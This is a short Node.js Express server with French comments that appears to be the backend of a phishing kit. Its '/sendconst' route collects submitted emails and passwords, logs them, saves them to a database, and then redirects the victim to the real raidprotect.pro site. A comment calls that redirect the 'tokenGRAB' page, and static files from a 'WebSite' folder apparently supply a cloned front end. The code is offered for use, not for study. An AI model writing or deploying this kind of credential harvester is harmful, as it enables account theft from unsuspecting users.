const db = require('./connect');
db.connect();
const VotreModele = require('./schema.js');
const express = require('express')
const app = express()
const ejs = require('ejs');
app.engine('html', ejs.renderFile);
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: true }));;


const UserAdd = require('./backend/UsersAdd.js');

// Route pour recevoir les constantes depuis le frontend
app.post('/sendconst', async (req, res) => {
    const userval = req.body;
    // Ajoute les identifiants dans la DB
    console.log(req.body);
    await UserAdd.AddUser(userval.password , userval.email);
    // Renvoie vers la page de tokenGRAB
    const referringPage = 'https://raidprotect.pro';
    res.status(200).redirect(referringPage);
});

app.set('view engine', 'ejs');
app.set('views', './Views'); // Chemin vers ton dossier de vues

app.get('/', function (req, res) {
    res.render('index',{
        
    })
});



// Définition d'un dossier statique pour les fichiers publics (CSS, images, etc.)
app.use(express.static('public'));
const path = require('path');
app.use(express.static(path.join(__dirname, '/WebSite')));

// Lancement du serveur

app.listen(process.env.port, () => {
    console.log('Serveur démarré sur le port ', process.env.port);
});